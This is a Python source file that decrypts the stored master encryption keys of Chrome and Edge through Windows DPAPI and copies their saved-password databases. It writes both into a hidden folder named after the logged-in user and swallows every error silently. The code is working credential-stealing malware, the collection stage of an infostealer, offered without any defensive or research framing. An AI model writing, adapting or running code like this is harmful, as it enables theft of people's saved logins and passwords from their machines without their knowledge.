"""
Data extraction module for retrieving browser master keys and login databases.

This module extracts encryption master keys and login credential databases
from Chrome and Edge browsers on Windows systems.
"""

import os
import json
import base64
from win32 import win32crypt
import shutil


def get_master_key(path, output):
    """
    Extract the master encryption key from a browser's Local State file.

    The master key is stored encrypted in the browser's Local State JSON file
    and is protected using Windows Data Protection API (DPAPI). This function
    decrypts it using the Windows CryptUnprotectData function.

    Args:
        path (str): Relative path to the browser directory (e.g., "Google\\Chrome")
        output (str): File path where the decrypted master key will be saved

    Returns:
        None. Writes the master key to the output file on success, silently fails otherwise.
    """
    try:
        # Read the Local State file which contains the encrypted master key
        local_state_path = os.environ['USERPROFILE'] + os.sep + fr'AppData\Local\{path}\User Data\Local State'
        with open(local_state_path, "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        # Extract and decode the base64-encoded encrypted key
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        # Skip the first 5 bytes (DPAPI header)
        master_key = master_key[5:]

        # Decrypt the key using Windows DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        # Write the decrypted master key to the output file
        open(output, "wb").write(master_key)
    except:
        # Silently fail if file doesn't exist or decryption fails
        pass


def get_login_data(path, output):
    """
    Copy the browser's login database to the specified output location.

    The login database (Login Data) contains encrypted usernames and passwords
    for saved credentials. This function creates a copy for later decryption.

    Args:
        path (str): Relative path to the browser directory (e.g., "Google\\Chrome")
        output (str): File path where the login database copy will be saved

    Returns:
        None. Copies the database file on success, silently fails otherwise.
    """
    try:
        # Construct the path to the Login Data database file
        login_db = os.environ['USERPROFILE'] + os.sep + fr'AppData\Local\{path}\User Data\default\Login Data'

        # Copy the database file to the output location
        shutil.copy2(login_db, output)
    except:
        # Silently fail if file doesn't exist or copy fails
        pass



if __name__ == "__main__":
    # Get the current logged-in username
    name = os.getlogin()

    # Create a directory named after the user
    os.makedirs(name)

    # Hide the directory from normal file explorer view using Windows attributes
    os.system(f"attrib +h {name}")

    # Extract Chrome browser data
    browser = "Chrome"
    get_master_key(r"Google\Chrome", fr"{name}\{browser}Key.dat")
    get_login_data(r"Google\Chrome", fr"{name}\{browser}Data.db")

    # Extract Edge browser data
    browser = "Edge"
    get_master_key(r"Microsoft\Edge", fr"{name}\{browser}Key.dat")
    get_login_data(r"Microsoft\Edge", fr"{name}\{browser}Data.db")
